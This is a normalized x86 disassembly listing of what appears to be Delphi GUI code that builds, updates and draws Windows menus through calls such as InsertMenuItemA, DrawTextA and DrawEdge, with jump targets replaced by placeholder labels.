mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044a0
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_450484
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44ea18
mov [ ebp - 0x25 ] eax
sub_44e783
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44e508
xor eax eax
pop ebp
retn
sub_44e7a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45207c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451044
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451540
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44df44
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44e818
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e862
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41855c
mov eax [ ebp - 0x4 ]
call sub_44ddcc
mov edx eax
mov eax ebx
call sub_4504b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e869
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_44e870
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44e8e8
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4194fc
sub_44e8ac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41987c
mov eax ebx
call sub_45046c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45046c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
mov eax ebx
call sub_44e8e8
sub_44e8e8
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44ea18
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44e8e8
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44ea18
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44ea18
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44e7a8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebp
call sub_44ea18
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44e9b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_450484
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_450494
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_450494
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_450494
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44dac0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44ea18
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44e7a8
mov eax [ rw-data ]
call sub_44dac0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44ea64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4197a4
push ebx
push sub_44e818
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44eaa8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44ec8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_450a40
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404078
test bh 0x4
je r-xdata
mov eax edi
call sub_45207c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d030
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042a8
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c9e8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c9f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec93
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042a0
push eax
mov eax [ ebp - 0xc ]
call sub_4044a0
push eax
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c728
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042a0
push eax
mov eax [ ebp - 0xc ]
call sub_4044a0
push eax
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c728
mov eax 0xff00000d
call sub_41c268
mov esi eax
mov eax 0xff000010
call sub_41c268
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c728
jmp r-xdata
sub_44ecf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44f5e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cf14
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c728
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cf14
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b894
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cf14
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44f13f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4227d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c728
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b894
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423828
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cee8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d2ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d470
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44bdac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cf14
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44eaa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c9f4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d20c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c728
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403290
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44eaa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f5e7
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp + 0x8 ]
